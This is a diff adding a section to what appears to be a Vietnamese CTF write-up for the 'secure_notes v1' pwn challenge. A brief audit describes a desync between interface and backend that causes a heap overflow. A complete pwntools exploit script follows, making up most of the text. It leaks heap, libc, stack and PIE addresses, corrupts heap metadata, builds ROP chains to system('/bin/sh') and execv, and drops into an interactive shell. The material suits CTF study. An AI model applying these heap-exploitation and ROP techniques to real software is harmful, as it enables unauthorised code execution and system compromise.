@@ -427,3 +427,205 @@ flag: `PwnableVN{n0_m0r3_cSu__Wh!t3L!5T_Is_b3tT3r}`
 ## secure_notes v1
 
 Bài này là một bài quản lý các note, gồm backend và một interface được chạy ở 2 process riêng biệt, interface sẽ giao tiếp với backend thông qua các Inter-Process Call. Bài này gồm 2 phần, phần 1 sẽ là tìm cách để exploit process interface và cat flag1, phần 2 sẽ là exploit process backend.  
+
+Ở phía interface, khi tạo một note thì note sẽ được lưu vào một doubly linked list, ta có thể lựa chọn để encrypt note này hoặc không, nếu encrypt thì note này sẽ tự động được sync với notes ở backend. Ta cũng có những chức năng khác như sync, delete, edit các notes. 
+
+### Auditing
+
+Sau một thời gian audit, ta nhận thấy có một bug trong quá trình sync note, ở interface, ta có thể tự do add nhiều note với title và author trùng nhau, nhưng ở backend nếu thực hiện add 1 note với title và author trùng với 1 note đã tồn tại thì nó sẽ thực hiện update note đó. Vậy thì với cơ chế này, ta có thể kiến cho list node ở interface và backend bị desync, tiếp đó ta có thể thực hiện sync note từ backend về interface
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/4fbcadf8-fdfd-46ac-9735-906a157852ca)
+
+Ở đây interface thực hiện copy buffer từ note được gửi về từ server và size cũng được quyết định bởi note của server, do đó ta sẽ có một bug heap-based buffer overflow.
+
+```python
+from pwn import *
+from pwn import unpack, p64, u64
+
+if args.REMOTE:
+    io = remote("secure_notes1.pwnable.vn", 31331)
+else:
+    # io = process(["./interface", "./backend"])
+    # io = process(["./interface_orig_patched", "./backend_orig_patched"])
+    io = remote("localhost", 8089)
+
+
+libc = ELF("./libc.so.6.bak", checksec=False)
+exe = ELF("./interface_orig", checksec=False)
+
+def add_new_note(title, author, is_encrypted, passwd, content_length, content):
+    io.sendlineafter(b"Choice: ", b"1")
+    io.sendlineafter(b"Title: ", title)
+    io.sendlineafter(b"Author: ", author)
+    io.sendlineafter(b"Wanna encrypt this notes? (y/n) ", b"y" if is_encrypted else b"n")
+    if is_encrypted:
+        io.sendlineafter(b"What is your passwd? ", passwd)
+    io.sendlineafter(b"How many bytes for content? ", str(content_length).encode())
+    io.sendlineafter(b"Content:", content)
+
+def note_sync(flag):
+    io.sendlineafter(b"Choice: ", b"6")
+    io.sendlineafter(b"You you want to [s]ync or [c]ommit note? (s/c)", b"c" if flag == 1 else b"s")
+
+def delete_note(title, author, is_encrypted, password):
+    io.sendlineafter(b"Choice: ", b"5")
+    io.sendlineafter(b"Title: ", title)
+    io.sendlineafter(b"Author: ", author)
+    if is_encrypted:
+        io.sendlineafter(b"Your password? ", password)
+
+def read_note(title, author, is_encrypted, passwd):
+    io.sendlineafter(b"Choice: ", b"3")
+    io.sendlineafter(b"Title: ", title)
+    io.sendlineafter(b"Author: ", author)
+    if is_encrypted:
+        io.sendlineafter(b"Password?", passwd)
+
+def list_note():
+    io.sendlineafter(b"Choice: ", b"2")
+
+def edit_note(title, author, is_encrypted, passwd, content_len, content):
+    io.sendlineafter(b"Choice: ", b"4")
+    io.sendlineafter(b"Title: ", title)
+    io.sendlineafter(b"Author: ", author)
+
+    if is_encrypted:
+        io.sendlineafter(b"Password ?", passwd)
+    io.sendlineafter(b"New content len?", str(content_len).encode())
+    io.sendlineafter(b"New content:", content)
+    
+
+
+
+add_new_note(b"shin24", b"shin24", False, None, 0, b"aaaaa")
+add_new_note(b"shin24", b"shin24", True, b"123", 960, b"A"*(928))
+
+edit_note(b"shin24", b"shin24", False, None, 40, b"aaaaaaa")
+
+# old_size_payload = b"A"*(40-32) + p64(0x391)
+
+# trigger heap overflow
+note_sync(0)
+
+read_note(b"shin24", b"shin24", False, None)
+
+leak = io.recvline()
+leak = unpack(leak[len(leak)-7:len(leak)-1], word_size=6*8)
+heap_base = leak - 0xbec0
+
+print("heap @ " + hex(heap_base))
+
+libc_on_heap = heap_base+0x198f8
+
+# restore old size so that `free` won't fail
+# add_new_note(b"shin24", b"shin24", False, None, 960, b"A"*(928))
+
+delete_note(b"shin24", b"shin24", False, None)
+
+
+add_new_note(b"hacker", b"hacker", False, None, 1, b"bbbbb")
+add_new_note(b"hacker", b"hacker", True, b"123", 452, b"A"*(248+76) + p64(0x91) + b"victim\x00\x00" + b"\x00"*56 + b"victim\x00\x00" + b"\x00"*24 + p64(0x14) + b"\x00"*8 + p64(libc_on_heap))
+
+
+edit_note(b"hacker", b"hacker", False, None, 240, b"aaaaaaa")
+add_new_note(b"victim", b"victim", False, None, 240, b"aaaaa")
+
+note_sync(0)
+
+read_note(b"victim", b"victim", False, None)
+
+io.recvuntil(b"Content: ")
+
+leak = unpack(io.recv(6), word_size=6*8)
+libc_addr = leak-0x21b6a0
+
+libc.address = libc_addr
+
+print("libc @ " + hex(libc.address))
+
+add_new_note(b"hacker2", b"hacker2", True, b"123", 452, b"A"*(248+76) + p64(0x91) + b"victim2\x00" + b"\x00"*56 + b"victim2\x00" + b"\x00"*24 + p64(0x14) + b"\x00"*8 + p64(libc.sym["environ"]))
+
+note_sync(0)
+
+read_note(b"victim2", b"victim2", False, None)
+
+io.recvuntil(b"Content: ")
+leak = unpack(io.recv(6), word_size=6*8)
+stack_leak = leak
+
+print("stack @ " + hex(stack_leak))
+
+stack_note_main_ret = stack_leak - 0x338
+
+victim2 = heap_base+0x48090
+
+add_new_note(b"hacker2", b"hacker2", True, b"123", 452+16, b"A"*(248+76) + p64(0x91) + b"victim2\x00" + b"\x00"*56 + b"victim2\x00" + b"\x00"*24 + p64(0x14) + b"\x00"*8 + b"C"*8 + p64(victim2) + p64(victim2))
+note_sync(0)
+
+# clear all notes
+delete_note(b"victim2", b"victim2", False, None)
+
+add_new_note(b"lalala", b"lalala", False, None, 0x90-16, b"aaa")
+
+pop_rdi = libc.address + 0x000000000002a3e5
+ret = pop_rdi+1
+
+sh = libc.address + 0x1d8678
+
+new_gate = heap_base + 0x486d0
+shin24 = heap_base + 0x48a60
+
+
+add_new_note(b"/bin/sh", b"newgate", False, None, 1, b"aaaaa")
+add_new_note(b"/bin/sh", b"newgate", True, b"123", 264+184+16, b"A"*(136+184-24-112) + p64(ret) + p64(pop_rdi) + p64(sh) + p64(libc.sym["system"]) + b"A"*(112-8) + p64(0x91) + b"/bin/sh\x00" + b"\x00"*56 + b"newgate\x00" + b"\x00"*24 + p64(0x7f) + p64(0) + p64(stack_note_main_ret) + p64(new_gate) + p64(new_gate))
+
+edit_note(b"lalala", b"lalala", False, None, 20, b"aaaaaaa")
+delete_note(b"lalala", b"lalala", False, None)
+
+edit_note(b"/bin/sh", b"newgate", False, None, 0x90-16, b"aaaaaaa")
+
+# cleanup old notes
+add_new_note(b"hacker2", b"hacker2", True, b"123", 20, b"aaa")
+delete_note(b"hacker2", b"hacker2", True, b"123")
+
+add_new_note(b"victim2", b"victim2", True, b"123", 20, b"aaa")
+delete_note(b"victim2", b"victim2", True, b"123")
+
+note_sync(0)
+# note_sync(0)
+
+read_note(b"/bin/sh", b"newgate", False, None)
+
+io.recvuntil(b"Content: ")
+leak = unpack(io.recv(6), word_size=6*8)
+pie = leak-0x3fc4
+
+exe.address = pie
+stack_note_main_ret = stack_leak - 0x338
+
+print("PIE @ " + hex(pie))
+
+pop_rdi = exe.address + 0x0000000000002852
+pop_rsi = exe.address + 0x0000000000002a40
+ret = exe.address + 0x2574
+
+
+delete_note(b"/bin/sh", b"newgate", False, None)
+
+add_new_note(b"lalala1", b"lalala1", False, None, 0x90-16, b"aaa")
+
+add_new_note(b"newgate2", b"newgate2", False, None, 1, b"aaaaa")
+add_new_note(b"newgate2", b"newgate2", True, b"123", 388+184, b"A"*4 + p64(ret)*47 + p64(pop_rdi) + p64(new_gate) + p64(pop_rsi) + p64(0) + p64(exe.sym["execv"]) + b"A"*8 + p64(0x91) + b"newgate2" + b"\x00"*56 + b"newgate2" + b"\x00"*24 + p64(0x7f) + p64(0) + p64(stack_note_main_ret) + p64(new_gate) + p64(shin24))
+
+edit_note(b"lalala1", b"lalala1", False, None, 20, b"aaaaaaa")
+delete_note(b"lalala1", b"lalala1", False, None)
+
+edit_note(b"newgate2", b"newgate2", False, None, 0x90-16, b"aaaaaaa")
+
+note_sync(0)
+
+pause()
+note_sync(0)
+
+io.interactive()
+```
